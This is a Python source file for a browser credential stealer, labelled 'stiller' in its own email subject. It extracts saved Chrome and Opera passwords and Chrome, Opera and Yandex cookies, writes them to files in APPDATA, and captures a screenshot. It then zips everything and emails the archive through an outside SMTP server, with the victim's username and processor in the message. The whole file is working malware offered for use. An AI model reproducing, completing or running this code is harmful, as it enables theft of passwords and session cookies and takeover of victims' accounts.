# -*- coding: utf-8 -*-
import cookies
import passworld
import os
import zipfile
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab
import platform

# setup
from_email = "mail@mail.com" # sender email
to_email = "mail2@mail.com" # recipient email
email_passworld = "PASSWORLD" #passworld from sender email
smtp = "smtp.yandex.ru" # smtp server address
smtp_port = 587 # smtp port
print("V0.2")

file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
file.write(passworld.chrome())
file.close()

file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
file.write(passworld.opera() + '\n')
file.close()

file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")
file.write(cookies.yandex()+ '\n')
file.close()

file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")
file.write(cookies.opera() + '\n')
file.close()

file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
file.write(cookies.chrome() + '\n')
file.close()

# creating screenshots
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + '\\sreenshot.jpg')

# creating zip file
zname= 'C:\\Users\\'+getpass.getuser()+'\\AppData\\log.zip'
newzip=zipfile.ZipFile(zname,'w')
newzip.write(os.getenv("APPDATA") + '\\google_pass.txt')
newzip.write(os.getenv("APPDATA") + '\\google_cookies.txt')
newzip.write(os.getenv("APPDATA") + '\\yandex_cookies.txt')
newzip.write(os.getenv("APPDATA") + '\\opera_pass.txt')
newzip.write(os.getenv("APPDATA") + '\\opera_cookies.txt')
newzip.write(os.getenv("APPDATA") + '\\sreenshot.jpg')
newzip.close()


# send mail
msg = MIMEMultipart()

msg['From'] = from_email
msg['To'] = to_email
msg['Subject'] = getpass.getuser()+" stiller"

body = "cpu: "+ platform.processor()

msg.attach(MIMEText(body, 'plain'))

filename = "log.zip"
attachment = open('C:\\Users\\'+getpass.getuser() + '\\AppData\\log.zip', "rb")

part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP(smtp, smtp_port)
server.starttls()
server.login(from_email, email_passworld)
text = msg.as_string()
server.sendmail(from_email, to_email, text)
server.quit()
print("finish")